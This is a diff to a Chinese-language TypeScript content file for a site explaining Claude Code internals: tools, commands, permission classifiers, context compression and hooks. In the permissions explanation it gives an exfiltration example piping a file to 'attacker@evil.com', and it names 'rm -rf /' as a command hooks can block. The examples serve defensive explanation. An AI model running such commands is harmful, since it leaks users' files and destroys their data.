@@ -38,6 +38,13 @@ export interface ArchEdge {
   label?: string;
 }
 
+export interface Insight {
+  title: string;
+  analogy: string;
+  explanation: string;
+  code?: string;
+}
+
 export interface Chapter {
   slug: string;
   title: string;
@@ -52,6 +59,7 @@ export interface Chapter {
   codeSnippets: CodeSnippet[];
   flowSteps: FlowStep[];
   flowConnections: FlowConnection[];
+  insights: Insight[];
   details: string[];
 }
 
@@ -189,10 +197,36 @@ if (feature('BRIDGE_MODE')) {
       { from: "render", to: "loop" },
     ],
     details: [
-      "Claude Code 使用 Bun 作为构建工具，将所有 TypeScript 源码打包为单个 cli.js 文件（~13MB），实现零依赖部署。",
-      "设置系统采用 6 层优先级合并：CLI 参数 > 本地设置 > 项目设置 > 用户设置 > MDM 策略 > 远程管理设置。",
-      "Feature Flags 通过 bun:bundle 的 feature() 函数实现编译时条件判断，支持 COORDINATOR_MODE、VOICE_MODE、BRIDGE_MODE 等特性的按需启用。",
-      "React + Ink 的组合让 Claude Code 能在终端中渲染丰富的交互界面，包括进度条、语法高亮、文件树等。",
+      "Claude Code 使用 Bun 作为构建工具，将所有 TypeScript 源码打包为单个 cli.js 文件（~13MB），实现零依赖部署。这意味着用户安装后不需要 node_modules，不会出现依赖冲突。",
+      "设置系统采用 6 层优先级合并：CLI 参数 > 本地设置 > 项目设置 > 用户设置 > MDM 策略 > 远程管理设置。数组类型的设置是替换而非合并，防止意外累加。",
+      "Feature Flags 通过 bun:bundle 的 feature() 函数实现编译时条件判断。和运行时 Feature Flags 不同的是，未启用的代码在构建时就被彻底删除（死代码消除），不会增加包体积。",
+      "React + Ink 的组合让 Claude Code 能在终端中渲染丰富的交互界面。Ink 将 React 的虚拟 DOM 映射到终端 ANSI 转义序列，让开发者可以用 JSX 写终端 UI。",
+      "main.tsx 是整个应用的引导器（4683行），负责按正确顺序初始化所有子系统。启动顺序很关键：认证必须在设置加载之前（因为远程设置需要认证），Feature Flags 必须在工具加载之前（因为工具的可见性依赖 Flags）。",
+      "认证支持 4 种方式：OAuth（浏览器登录）、API Key（环境变量）、AWS Bedrock（云服务）、Google Vertex AI（云服务）。每种方式有独立的认证流程和 Token 刷新机制。",
+      "GrowthBook 作为 Feature Flags 的远程控制平面，允许 Anthropic 不发版就能开关功能。比如新的 KAIROS 协调模式可以先对 1% 用户开放，观察效果后再全量发布。",
+      "Bootstrap State 是一个全局可变对象，存储在启动阶段确定的不变量：Session ID、工作目录、项目根、SDK Beta 列表等。这些值在整个会话生命周期内不会变化。",
+    ],
+    insights: [
+      {
+        title: "零依赖的 13MB 全家桶",
+        analogy: "就像一辆自带引擎和油箱的赛车 — 不需要加油站（node_modules），开箱即跑",
+        explanation: "大多数 Node.js 应用依赖成百上千个 npm 包，安装时经常出现版本冲突、安全漏洞等问题。Claude Code 把所有代码打包进一个 13MB 的文件，用户安装时零依赖下载。这是通过 Bun 的 bundler 实现的——它把 1885 个源文件编译、打包、摇树优化后合并为一个可执行的 JavaScript 文件。代价是开发时需要精心管理模块边界，但用户体验极好。",
+      },
+      {
+        title: "Feature Flags 不是开关，是手术刀",
+        analogy: "就像出版社印刷时直接删掉不需要的章节，而不是在书里夹一张'请跳过第5章'的纸条",
+        explanation: "传统 Feature Flags 在运行时判断 if (flag) {...}，未启用的代码仍然存在于程序中。Claude Code 的 feature() 在构建时就被替换为 true/false 字面量，Bun 的 tree-shaker 随后将 if (false) {...} 整块删除。这意味着面向外部用户的构建里，内部功能（如 KAIROS 协调模式、语音模式）的代码一个字节都不存在。这同时也是一种安全措施——外部用户无法通过逆向工程发现未发布的功能。",
+      },
+      {
+        title: "六层千层饼设置系统",
+        analogy: "就像法律体系：宪法 > 法律 > 地方法规 > 公司制度 > 个人习惯。高层级的规则自动覆盖低层级",
+        explanation: "Claude Code 的设置从 6 个来源合并：用户全局设置、项目设置、本地设置、CLI 参数、MDM（企业管理策略）和远程管理设置。关键的设计决策是：数组类型的设置（如 allowedTools）是替换而非合并。如果你在项目设置里定义了允许的工具列表，它会完全替代用户设置里的列表，而不是把两个列表拼在一起。这避免了'我明明在项目里禁了某个工具，为什么全局设置还是允许了？'的困惑。MDM 层还支持 Windows 注册表和 macOS plist，让企业 IT 管理员可以通过设备管理系统统一配置所有员工的 Claude Code。",
+      },
+      {
+        title: "启动顺序像多米诺骨牌",
+        analogy: "就像做饭必须先洗菜再切菜再炒菜——顺序错了，整道菜就废了",
+        explanation: "main.tsx 的 4683 行代码按严格顺序初始化子系统。认证必须先于设置加载（远程设置需要认证 Token 才能获取），Feature Flags 必须先于工具注册（工具的可见性取决于 Flag 状态），MCP 配置必须先于技能加载（MCP 技能需要知道有哪些可用服务器）。如果顺序错了，可能出现用户还没登录就尝试获取远程设置（网络错误），或者工具列表缺少了被 Flag 控制的新工具。",
+      },
     ],
   },
   {
@@ -319,6 +353,79 @@ export const BashTool: Tool = {
 }`,
         description: "BashTool 展示了工具的典型实现模式：输入验证 → 权限检查 → 执行 → 返回结果。",
       },
+      {
+        title: "全部 42+ 内置工具一览",
+        language: "typescript",
+        code: `// ═══ 文件操作（5 个）═══
+// Read       — 读取文件（支持图片、PDF、Jupyter）
+// Write      — 创建或完全重写文件
+// Edit       — 精确字符串替换编辑
+// Glob       — 文件名模式匹配搜索
+// NotebookEdit — Jupyter 单元格编辑
+
+// ═══ 命令执行（2 个）═══
+// Bash       — 执行 shell 命令（最复杂，20 个子模块）
+// PowerShell — 执行 PowerShell 命令
+
+// ═══ 搜索与信息（4 个）═══
+// Grep       — 基于 ripgrep 的内容搜索
+// WebFetch   — 抓取网页内容并分析
+// WebSearch  — 搜索引擎查询
+// LSP        — 语言服务器（跳转定义、查找引用）
+
+// ═══ Agent 与任务（7 个）═══
+// Agent      — 启动子代理处理复杂任务
+// TaskCreate — 创建任务
+// TaskGet    — 获取任务详情
+// TaskList   — 列出所有任务
+// TaskUpdate — 更新任务状态
+// TaskStop   — 停止后台任务
+// TaskOutput — 获取后台任务输出
+
+// ═══ 规划与工作流（4 个）═══
+// EnterPlanMode — 进入计划模式
+// ExitPlanMode  — 退出计划模式
+// EnterWorktree — 创建隔离 Git Worktree
+// ExitWorktree  — 退出 Worktree
+
+// ═══ 通信与交互（3 个）═══
+// AskUserQuestion — 向用户提问（多选题）
+// SendMessage     — 向其他代理发消息
+// Skill           — 执行技能（/command）
+
+// ═══ 定时任务（3 个）═══
+// CronCreate — 创建定时任务
+// CronDelete — 删除定时任务
+// CronList   — 列出定时任务
+
+// ═══ MCP 集成（4 个）═══
+// MCPTool          — 调用 MCP 服务器工具
+// ListMcpResources — 列出 MCP 资源
+// ReadMcpResource  — 读取 MCP 资源
+// McpAuthTool      — MCP 认证
+
+// ═══ 团队协作（3 个）═══
+// TeamCreate  — 创建多代理团队
+// TeamDelete  — 删除团队
+// SendMessage — 团队消息传递
+
+// ═══ 其他（5+ 个）═══
+// TodoWrite   — 创建待办列表
+// ToolSearch  — 搜索延迟加载的工具
+// Brief       — 发送格式化消息给用户
+// Sleep       — 延迟执行（Feature-gated）
+// Config      — 配置设置（内部）
+
+// ═══ Feature-gated 实验性工具 ═══
+// WebBrowserTool    — 浏览器自动化
+// WorkflowTool      — 工作流脚本
+// MonitorTool       — 后台进程监控
+// TerminalCaptureTool — 终端截图
+// ListPeersTool     — 列出同行会话
+// RemoteTriggerTool — 远程触发
+// SnipTool          — 历史管理`,
+        description: "工具按职能分为 8 大类。核心工具（Bash、Read、Write、Edit、Grep、Glob）面向所有用户；Feature-gated 工具通过编译时开关控制，外部构建中物理不存在。",
+      },
     ],
     flowSteps: [
       { id: "model", label: "模型请求工具", description: "Claude 输出 tool_use 块" },
@@ -336,10 +443,38 @@ export const BashTool: Tool = {
       { from: "execute", to: "result" },
     ],
     details: [
-      "每个工具以独立目录存在于 tools/ 下，如 tools/BashTool/BashTool.ts，方便模块化管理。",
-      "工具通过 Feature Flags 条件加载，内部用户（ant）可以访问额外工具。",
-      "BashTool 是最复杂的工具，包含 20 个子模块，处理沙箱、超时、后台执行等。",
-      "MCPTool 支持动态加载外部 MCP 服务器提供的工具，实现无限扩展。",
+      "每个工具以独立目录存在于 tools/ 下，如 tools/BashTool/BashTool.ts，方便模块化管理。每个目录就是一个完整的功能单元，包含实现、测试和辅助文件。",
+      "工具通过 Feature Flags 条件加载，内部用户（ant）可以访问额外工具。这意味着外部构建和内部构建的工具集是不同的。",
+      "BashTool 是最复杂的工具，包含 20 个子模块，处理沙箱（通过 sandbox-adapter.ts 将权限规则转换为操作系统级的路径限制）、超时（默认 120 秒）、后台执行（超过 15 秒自动后台化）等。",
+      "MCPTool 支持动态加载外部 MCP 服务器提供的工具，实现无限扩展。每个 MCP 工具被注册时，名称会加上 mcp__{serverName}__ 前缀，确保与内置工具不冲突。",
+      "buildTool() 函数使用 TypeScript 映射类型实现类型安全的默认值注入。所有可选方法（isEnabled、isReadOnly、isDestructive 等）都有安全的默认值，新工具只需定义核心逻辑。",
+      "工具执行上下文（ToolExecutionContext）携带了工作目录、权限上下文、中断信号和进度回调。中断信号（AbortSignal）让用户可以随时按 Ctrl+C 取消正在执行的工具。",
+      "进度回调系统支持多种进度类型：BashProgress（命令输出流）、MCPProgress（MCP 工具状态）等。UI 层根据进度类型渲染不同的展示形式（如搜索类命令自动折叠输出）。",
+      "BashTool 的命令分类器能理解管道：ls | grep foo 整条管道被识别为'搜索'操作而非'写入'操作，因为它分析了管道中每个命令的语义角色。echo 和 printf 被标记为'语义中性'——它们不改变管道的整体性质。",
+      "工具的 checkPermissions() 方法允许每个工具在通用权限系统之外实现自己的权限逻辑。比如 BashTool 需要解析命令内容来判断危险性，而 FileEditTool 需要检查目标文件是否在受保护路径下。",
+      "沙箱适配器（sandbox-adapter.ts）将用户配置的权限规则转换为操作系统级限制。它支持 4 种路径前缀语法：// 表示从根开始的绝对路径，/ 表示相对于设置文件的路径，~/ 表示用户主目录，./ 表示当前工作目录。",
+    ],
+    insights: [
+      {
+        title: "失败安全的默认值：忘了声明就被拦截",
+        analogy: "就像银行保险柜默认锁住，必须明确打开才能取东西。不是'忘了锁门'导致被盗，而是'忘了开门'导致进不去",
+        explanation: "buildTool() 给每个工具设置的默认值都是最保守的：isConcurrencySafe 默认 false（不允许并行）、isReadOnly 默认 false（假设有副作用）、isDestructive 默认 false（但默认需要权限检查）。如果一个新工具的开发者忘了声明自己是安全的，结果是这个工具会被权限系统额外审查——而不是被默默放行。这是安全领域'fail-closed'原则的完美实践。",
+      },
+      {
+        title: "Bash 能看懂你的管道",
+        analogy: "就像海关不只看最后一个包裹，而是检查整条运输链路上的每一环",
+        explanation: "当 Claude 想执行 cat log.txt | grep error | wc -l 时，BashTool 不是简单地看到这是一条 Bash 命令就放行或拦截。它把管道拆开，逐个分析每个命令的语义：cat 是读取、grep 是搜索、wc 是统计——整条管道是'只读'操作，可以安全执行。但如果管道变成 cat log.txt | mail attacker@evil.com，最后一环是'发送'操作，就会被标记为需要审查。中间的 echo、printf 等命令被标记为'语义中性'，不影响管道整体的安全性判断。",
+      },
+      {
+        title: "15 秒自动转后台：AI 不会被卡住",
+        analogy: "就像你让助理去打印文件，如果 15 秒还没打完，助理会说'我放后台打印了，先继续别的工作'",
+        explanation: "当 Bash 命令执行超过 15 秒时（ASSISTANT_BLOCKING_BUDGET_MS），BashTool 自动将其转为后台任务。这个设计解决了一个关键问题：AI 助手在等待长命令时会完全阻塞，无法响应用户。转后台后，主循环继续运行，AI 可以同时处理其他任务。用户会看到一个后台任务通知，命令完成后结果会被自动收集。前 2 秒内不显示进度（PROGRESS_THRESHOLD_MS），避免闪烁。",
+      },
+      {
+        title: "沙箱适配器：权限规则变成操作系统护栏",
+        analogy: "就像把'不许进厨房'的口头规定变成了厨房门上的实体锁",
+        explanation: "用户在 settings.json 里写的权限规则（如'禁止编辑 .env 文件'）是文本规则，sandbox-adapter.ts 把它们转换成操作系统级的路径限制。这意味着即使 AI 试图绕过文本级别的检查（比如用 cat 读取后再写入另一个文件），操作系统也会直接阻止写入受保护路径。路径语法支持 4 种前缀（//、/、~/、./），让用户可以精确控制保护范围。",
+      },
     ],
   },
   {
@@ -410,6 +545,92 @@ export const commands: Command[] = [
 ]`,
         description: "命令注册中心统一管理所有 slash 命令的名称、处理函数和描述。",
       },
+      {
+        title: "全部 75+ 内置命令一览",
+        language: "typescript",
+        code: `// ═══ 会话管理（12 个）═══
+// /clear (别名: /reset, /new) — 清空对话历史
+// /compact    — 压缩对话但保留摘要
+// /resume     — 恢复之前的对话
+// /rename     — 重命名当前对话
+// /branch     — 从当前位置创建对话分支
+// /rewind     — 回退代码/对话到之前的点
+// /exit       — 退出 REPL
+// /add-dir    — 添加新工作目录
+// /context    — 可视化当前上下文使用量
+// /desktop    — 在 Claude Desktop 中继续
+// /session    — 显示远程会话 URL 和二维码
+// /tasks      — 管理后台任务
+
+// ═══ 代码开发（6 个）═══
+// /diff           — 查看未提交变更和逐轮 diff
+// /commit         — 创建 git commit
+// /commit-push-pr — 一键提交+推送+创建PR
+// /review         — 代码审查
+// /security-review — 安全审查
+// /pr-comments    — 获取 GitHub PR 评论
+
+// ═══ 配置与设置（15 个）═══
+// /config    — 打开配置面板
+// /model     — 切换 AI 模型
+// /effort    — 设置模型努力级别
+// /fast      — 切换快速模式
+// /theme     — 切换主题
+// /color     — 设置提示栏颜色
+// /keybindings  — 配置快捷键
+// /permissions  — 管理权限规则
+// /hooks        — 查看 Hook 配置
+// /ide          — 管理 IDE 集成
+// /sandbox      — 沙箱安全设置
+// /vim          — 切换 Vim 编辑模式
+// /voice        — 切换语音模式
+// /brief        — 切换简洁模式
+// /privacy-settings — 隐私设置
+
+// ═══ 信息与帮助（8 个）═══
+// /help          — 显示帮助和可用命令
+// /status        — 显示状态（版本、模型、账号）
+// /usage         — 显示计划使用量
+// /cost          — 显示当前会话费用
+// /stats         — 显示使用统计
+// /doctor        — 诊断安装问题
+// /release-notes — 查看更新日志
+// /version       — 打印版本号
+
+// ═══ 账号与认证（4 个）═══
+// /login  — 登录 Anthropic 账号
+// /logout — 登出
+// /install-slack-app  — 安装 Slack 应用
+// /install-github-app — 配置 GitHub Actions
+
+// ═══ Agent 与规划（5 个）═══
+// /plan    — 启用计划模式
+// /agents  — 管理 Agent 配置
+// /plugin  — 管理插件
+// /reload-plugins — 重载插件
+// /btw     — 快速旁白提问（不中断主对话）
+
+// ═══ 扩展与工具（6 个）═══
+// /mcp       — 管理 MCP 服务器
+// /skills    — 列出可用技能
+// /chrome    — Chrome 集成设置
+// /copy      — 复制最后回复到剪贴板
+// /export    — 导出对话到文件
+// /files     — 列出上下文中的文件
+
+// ═══ 其他（10+ 个）═══
+// /memory    — 编辑 Claude 记忆文件
+// /insights  — 生成使用分析报告
+// /tag       — 给对话加可搜索标签
+// /stickers  — 订购 Claude Code 贴纸
+// /feedback  — 提交反馈
+// /mobile    — 显示移动端下载二维码
+// /passes    — 分享免费周给朋友
+// /upgrade   — 升级到 Max
+// /rate-limit-options — 限速时显示选项
+// /extra-usage — 配置额外用量`,
+        description: "命令按功能分为 8 大类，覆盖了从会话管理到代码开发的完整工作流。",
+      },
     ],
     flowSteps: [
       { id: "input", label: "用户输入 /command", description: "在 REPL 中输入斜杠命令" },
@@ -427,9 +648,25 @@ export const commands: Command[] = [
       { from: "execute", to: "output" },
     ],
     details: [
-      "命令和工具是两个独立的系统：命令面向用户（/commit），工具面向模型（Bash, Read 等）。",
-      "部分命令如 commit-push-pr 是复合命令，串联多个操作为完整工作流。",
-      "命令支持自动补全，在 REPL 中按 Tab 可以看到可用命令列表。",
+      "命令和工具是两个独立的系统：命令面向用户（/commit），工具面向模型（Bash, Read 等）。用户通过 / 前缀触发命令，Claude 通过 tool_use API 调用工具。",
+      "部分命令如 commit-push-pr 是复合命令，串联多个操作为完整工作流：先运行 git status、git diff 分析变更，生成 commit message，创建 commit，推送到远程，最后创建 Pull Request。",
+      "命令支持自动补全，在 REPL 中按 Tab 可以看到可用命令列表。自动补全系统会根据上下文过滤命令（如未在 git 仓库中时隐藏 git 相关命令）。",
+      "每个命令以独立目录存在于 commands/ 下，包含元数据（名称、描述、参数定义）、处理函数、权限要求。这种组织方式让添加新命令就像添加新目录一样简单。",
+      "部分命令用 feature() 守卫，仅在内部构建中可见（ant-only）。外部用户看不到也无法调用这些命令，甚至不知道它们的存在。",
+      "命令的 handler 函数可以直接操作 AppState（修改消息、更新 UI），也可以向 REPL 注入新的用户消息让 Claude 处理。比如 /commit 命令实际上是向 Claude 发送了一条'帮我创建 commit'的消息。",
+      "命令系统和技能系统有明确分工：命令是'硬编码'的 TypeScript 函数，有完整的运行时访问权限；技能是'软编码'的提示词模板，通过 AI 间接执行。命令更强大但需要代码修改，技能更灵活但能力有限。",
+    ],
+    insights: [
+      {
+        title: "命令给人用，工具给 AI 用",
+        analogy: "就像餐厅里，菜单给客人看（命令），厨房设备给厨师用（工具）。客人说'我要宫保鸡丁'（/commit），厨师操作炒锅和刀具（Bash, Edit）来完成",
+        explanation: "这个分离设计解决了一个关键的 UX 问题：用户需要的交互方式和 AI 需要的接口是不同的。用户想要简洁的 /commit，AI 需要精确的 Bash(git add...) + Edit(commit-msg) 调用链。命令系统将用户意图翻译成 AI 可以理解和执行的工具调用序列。",
+      },
+      {
+        title: "复合命令像流水线",
+        analogy: "就像汽车工厂的装配线，每个工位做一件事，车从头走到尾就组装完成了",
+        explanation: "commit-push-pr 命令把 6 个步骤串联在一起：检查状态 → 分析差异 → 生成 commit message → 创建 commit → push → 创建 PR。每个步骤都可以独立执行，但组合在一起就是一个完整的工作流。失败时会在出错步骤停下来，不会继续执行后续步骤（比如 commit 失败就不会 push）。",
+      },
     ],
   },
   {
@@ -520,10 +757,32 @@ type PermissionDecision =
       { from: "classify", to: "execute" },
     ],
     details: [
-      "权限系统是 Claude Code 最重要的安全机制，防止 AI 执行危险操作（如 rm -rf, git push --force）。",
-      "auto 模式使用 2 阶段分类器：先用快速分类器判断，不确定时使用思考型分类器。",
-      "危险权限（如 bypassPermissions）在某些环境下会被自动剥离。",
-      "每个权限决策都包含详细的来源信息，方便用户追溯。",
+      "权限系统是 Claude Code 最重要的安全机制，防止 AI 执行危险操作（如 rm -rf, git push --force）。每次 AI 请求调用工具时，都要经过权限检查。",
+      "auto 模式使用 2 阶段分类器：Stage 1（fast）用极少的 Token（最多 64 个）快速判断，如果判断为'允许'就直接放行；如果判断为'阻止'，再进入 Stage 2（thinking）进行深度推理，减少误判。这个设计在安全性和延迟之间找到了精妙的平衡。",
+      "Stage 1 和 Stage 2 共享相同的系统提示词和用户内容，所以 Stage 2 可以命中 Stage 1 的 prompt cache（1 小时 TTL），几乎不增加额外的 API 成本。",
+      "安全工具免检通道：Read、Grep、Glob 等只读工具被放在 SAFE_YOLO_ALLOWLISTED_TOOLS 白名单中，完全跳过分类器调用。这每次节省一次 API 请求（~500ms 延迟 + 费用），对频繁调用的搜索工具影响巨大。",
+      "危险权限（如 bypassPermissions）在某些环境下会被自动剥离。被剥离的规则不是简单删除，而是移动到 strippedDangerousRules 字段，留有审计记录。",
+      "权限规则支持 MCP 服务器级前缀匹配：mcp__github 可以匹配来自 github 服务器的所有工具，mcp__github__* 是通配符写法。管理员可以一条规则禁用整个 MCP 服务器。",
+      "每个权限决策都包含详细的来源信息（来自哪个设置文件的哪条规则），方便用户追溯'为什么这个操作被允许/拒绝了'。",
+      "分类器使用 XML 格式的输出（<block>yes/no</block><reason>...</reason>），解析时会先剥离 <thinking> 标签内容，避免推理过程中的'yes'/'no'字样被误判为最终结论。",
+      "带自适应思考（adaptive thinking）的新模型需要特殊处理：不能简单地设置 thinking: false，而是给额外的 max_tokens 预算让模型自由使用思考能力。",
+    ],
+    insights: [
+      {
+        title: "两阶段分类器像法院系统",
+        analogy: "先过治安法庭（快速裁决，500毫秒），有争议才上诉到高级法院（深度审理）。90% 的案件在治安法庭就结案了",
+        explanation: "当 Claude 请求执行一个工具时，Stage 1 分类器用最多 64 个 Token 做出快速判断。如果是明显安全的操作（读取文件），直接放行。如果是明显危险的（删除文件），直接阻止。只有在模糊地带（如修改配置文件），才会启动 Stage 2 的完整推理。这让 90% 的权限检查在 500ms 内完成，而不是每次都花 2-3 秒做深度分析。两个阶段共享 prompt cache，所以 Stage 2 几乎不增加额外成本。",
+      },
+      {
+        title: "安全工具走 VIP 通道",
+        analogy: "就像机场安检，航空公司机组人员有快速通道——因为他们已经被充分审查过了",
+        explanation: "Read、Grep、Glob 这些只读工具被放在白名单里，完全跳过分类器。道理很简单：读取文件不可能造成破坏。跳过分类器每次省约 500ms 延迟和一次 API 调用费用。考虑到一次代码搜索任务可能调用几十次 Grep，这个优化累计节省了大量时间和成本。但白名单是保守的——只有不可能产生副作用的工具才有资格。",
+      },
+      {
+        title: "被没收的权限留有收据",
+        analogy: "就像海关没收违禁品后会开具扣押凭证——东西不让你带，但有记录证明你曾经试图带进来",
+        explanation: "当管理员的策略（policySettings）与用户设置冲突时，比如用户设了 bypassPermissions 但管理员禁止了，这条规则不是被默默删除，而是被移到 strippedDangerousRules 里。用户可以看到'你的这条规则因为策略限制被移除了'。这比无声失败好得多——用户不会困惑'为什么我配了但没生效'，管理员也能审计哪些用户试图绕过安全策略。",
+      },
     ],
   },
   {
@@ -614,9 +873,47 @@ function evictMessages(messages: Message[], maxTokens: number): Message[]`,
       { from: "compress", to: "send" },
     ],
     details: [
-      "消息系统是 Claude Code 的通信中枢，所有用户交互和模型响应都通过它流转。",
-      "上下文压缩是保证长对话可用性的关键：对话越长，越早的内容会被逐步压缩和摘要化。",
-      "粘贴内容通过引用系统去重，避免大量重复文本占用上下文窗口。",
+      "消息系统是 Claude Code 的通信中枢，所有用户交互和模型响应都通过它流转。消息类型远不止文本——tool_use、tool_result、progress 等都是一等公民。",
+      "上下文压缩是保证长对话可用性的关键。4 层压缩策略渐进式工作：先裁剪冗余工具输出，再用 AI 摘要替代早期对话，然后截断超大内容，最后驱逐最旧的消息轮次。",
+      "压缩时 AI 使用 <analysis> 标签进行内部推理（如分析哪些信息重要），但只有 <summary> 标签内的内容会被保留进上下文——这是一种让 AI '打草稿' 的机制。",
+      "压缩后系统会自动重新注入最常用的 5 个文件和技能定义。这意味着即使上下文被压缩，核心工作文件的内容不会丢失。",
+      "如果压缩请求本身太长（超过模型上下文），系统有 'escape hatch'：直接丢弃最旧的对话轮次，而不是崩溃。",
+      "粘贴内容通过引用系统去重——如果用户多次粘贴同一段代码，只保留一份实体，其余用引用指针替代。",
+      "虚拟消息 (virtual messages) 是 REPL 内部调用产生的消息，对用户完全不可见，用于工具间的内部通信。",
+      "query.ts (1729行) 和 QueryEngine.ts (1295行) 构成查询执行引擎，负责将处理好的消息序列发送到 Anthropic API 并处理流式响应。",
+    ],
+    insights: [
+      {
+        title: "压缩时 AI 自己先打草稿",
+        analogy: "就像考试时先在草稿纸上列提纲，只把最终答案写到答题纸上",
+        explanation: "压缩过程中，AI 用 <analysis> 标签做内部推理——分析哪些信息重要、哪些可以丢弃。但只有 <summary> 标签里的精炼内容才会真正进入压缩后的上下文。这让 AI 可以'思考'而不浪费宝贵的上下文空间。",
+        code: `// 压缩提示词中的关键设计
+// AI 输出格式：
+// <analysis>
+//   这段对话主要讨论了文件X的重构...
+//   用户关心的是性能，不是代码风格...
+// </analysis>
+// <summary>
+//   用户正在重构 utils/parser.ts 以提升性能。
+//   已完成：缓存层、异步化。待做：批处理优化。
+// </summary>
+// 只有 <summary> 的内容会被保留`,
+      },
+      {
+        title: "压缩后自动补回常用文件",
+        analogy: "就像搬家时虽然扔了很多东西，但钥匙、钱包、手机一定会随身带着",
+        explanation: "上下文被压缩后，系统会统计对话中最频繁引用的 5 个文件，重新将它们的内容注入到上下文中。同时，当前激活的技能定义也会被恢复。这确保压缩不会让 AI '忘记' 正在处理的核心文件。",
+      },
+      {
+        title: "自己压缩失败时有逃生舱",
+        analogy: "飞机有备用发动机——如果主引擎故障，备用引擎能让你安全降落",
+        explanation: "如果需要压缩的对话本身就已经超过了模型的上下文限制（连压缩请求都发不出去），系统不会崩溃。它有一个 escape hatch：直接丢弃最旧的对话轮次，粗暴但有效地把大小降下来。这是最后的保底措施。",
+      },
+      {
+        title: "粘贴内容用引用去重",
+        analogy: "图书馆不会因为 10 个人借同一本书就买 10 本——用借书卡指向同一本就行",
+        explanation: "当用户反复粘贴同一段代码或文本时，消息系统只保留一份实体内容，其余引用通过指针关联。这在调试场景中特别有用——用户可能多次粘贴错误日志，但不会重复占用上下文空间。",
+      },
     ],
   },
   {
@@ -689,6 +986,53 @@ type HookEvent =
 // }`,
         description: "11 种生命周期事件覆盖了 Claude Code 的完整工作流程，从会话开始到工具执行。",
       },
+      {
+        title: "11 种 Hook 事件详解",
+        language: "typescript",
+        code: `// ═══ 会话生命周期 ═══
+// SessionStart     — 会话初始化时触发
+//                    用途：设置环境变量、加载项目配置
+// Setup            — 初始设置完成时触发
+//                    用途：一次性初始化操作
+
+// ═══ 工具执行周期 ═══
+// PreToolUse       — 工具执行前触发（最强大！）
+//   可以：✅ 修改工具输入参数
+//         ✅ 直接返回 allow/deny 权限决策
+//         ✅ 注入额外上下文
+//   用途：自定义安全策略、参数过滤、审计日志
+//
+// PostToolUse      — 工具执行成功后触发
+//   可以：✅ 修改工具输出
+//         ✅ 触发后续操作
+//   用途：输出过滤、合规记录、自动化后续步骤
+//
+// PostToolUseFailure — 工具执行失败后触发
+//   用途：错误报告、告警、自动重试逻辑
+
+// ═══ 用户交互 ═══
+// UserPromptSubmit — 用户提交输入时触发
+//   可以：✅ 修改用户输入
+//         ✅ 注入额外指令
+//   用途：输入过滤、自动附加上下文
+
+// ═══ 权限相关 ═══
+// PermissionRequest — 权限检查时触发
+//   用途：自定义权限审批流程
+// PermissionDenied  — 权限被拒绝时触发
+//   用途：记录被拒操作、通知管理员
+
+// ═══ 环境变更 ═══
+// CwdChanged  — 工作目录变更时触发
+//   用途：重新加载项目配置
+// FileChanged — 文件变更时触发
+//   用途：自动格式化、lint 检查
+
+// ═══ 通知 ═══
+// Notification — 通知事件触发
+//   用途：转发到 Slack、邮件等外部系统`,
+        description: "每种事件都有特定的输入/输出契约，PreToolUse 是最强大的——能修改工具参数并做权限决策。",
+      },
     ],
     flowSteps: [
       { id: "trigger", label: "事件触发", description: "如工具即将执行" },
@@ -704,10 +1048,42 @@ type HookEvent =
       { from: "response", to: "continue" },
     ],
     details: [
-      "Hook 是 Claude Code 的主要扩展机制，替代了传统插件系统。",
-      "PreToolUse Hook 可以修改工具输入或直接设置权限（allow/deny），实现自定义安全策略。",
-      "PostToolUse Hook 可以审计工具执行结果，实现合规日志记录。",
-      "所有 Hook 都有超时保护，防止挂起阻塞主流程。",
+      "Hook 是 Claude Code 的主要扩展机制，替代了传统插件系统。它比插件更轻量——只需在 settings.json 中配置 shell 命令，无需写完整的插件代码。",
+      "PreToolUse Hook 可以修改工具输入或直接设置权限（allow/deny），实现自定义安全策略。比如企业可以配置 Hook 禁止所有对 /etc 目录的写操作。",
+      "PostToolUse Hook 可以审计工具执行结果，实现合规日志记录。每次 AI 执行文件写入后，Hook 可以自动记录到审计日志。",
+      "所有 Hook 都有超时保护，防止挂起阻塞主流程。默认超时是合理的短值，确保一个失败的 Hook 不会让整个 Claude 卡住。",
+      "标记 async: true 的钩子不会阻塞主循环——它被放入异步任务注册表，主循环继续运行，定期检查任务完成状态。",
+      "多个钩子使用 Promise.allSettled 并行执行，而不是 Promise.all。区别在于：allSettled 即使某个钩子失败也不会中断其他钩子——一个坏了的钩子不会连坐拖垮整个系统。",
+      "Hook 的输入通过 stdin 以 JSON 格式传递——包含事件类型、工具名称、工具输入等完整上下文。Hook 的 stdout 输出也是 JSON，可以返回修改后的参数或权限决策。",
+      "11 种事件类型覆盖了完整生命周期：从 SessionStart（会话开始）到 FileChanged（文件变更），每个关键节点都可以被 Hook 拦截。",
+    ],
+    insights: [
+      {
+        title: "异步钩子像便利贴任务板",
+        analogy: "你可以把便利贴贴到任务板上就走，不用站在那里等任务完成——回头再来看结果",
+        explanation: "标记 async: true 的钩子不会阻塞 Claude 的主循环。它被放入一个异步任务注册表（像便利贴板），主循环继续工作。系统定期检查任务板上的便利贴是否完成，完成了就收集结果。这让耗时操作（如发通知、写审计日志）不拖慢 AI 的响应速度。",
+      },
+      {
+        title: "Promise.allSettled 防连坐",
+        analogy: "就像公司里一个部门出问题不应该让整个公司停工——其他部门继续正常运转",
+        explanation: "多个 Hook 用 Promise.allSettled（而非 Promise.all）并行执行。Promise.all 是'一个失败全部失败'，而 allSettled 是'各管各的'。一个审计 Hook 崩溃了，不影响安全检查 Hook 和通知 Hook 正常完成。这种隔离设计在企业环境中尤为重要。",
+        code: `// Promise.all vs Promise.allSettled
+// Promise.all: 一个reject，全部失败 ❌
+// Promise.allSettled: 每个独立完成 ✅
+const results = await Promise.allSettled(
+  hooks.map(hook => executeHook(hook, context))
+)
+// results: [
+//   { status: 'fulfilled', value: ... },
+//   { status: 'rejected', reason: ... },  // 这个失败了
+//   { status: 'fulfilled', value: ... },  // 但不影响这个
+// ]`,
+      },
+      {
+        title: "PreToolUse 钩子能篡改输入",
+        analogy: "就像机场安检员不只检查行李，还能没收危险物品再让你登机——修改后继续流程",
+        explanation: "PreToolUse Hook 不只是一个'观察者'，它可以直接修改工具的输入参数。比如 Bash 工具要执行 rm -rf /，Hook 可以拦截它，把命令改成安全的版本，或者直接返回 deny 阻止执行。这让企业可以实现精细的安全策略，而无需修改 Claude Code 源码。",
+      },
     ],
   },
   {
@@ -793,10 +1169,31 @@ type HookEvent =
       { from: "use", to: "result" },
     ],
     details: [
-      "MCP 让 Claude Code 能够无限扩展工具能力，连接到任何实现了 MCP 协议的服务器。",
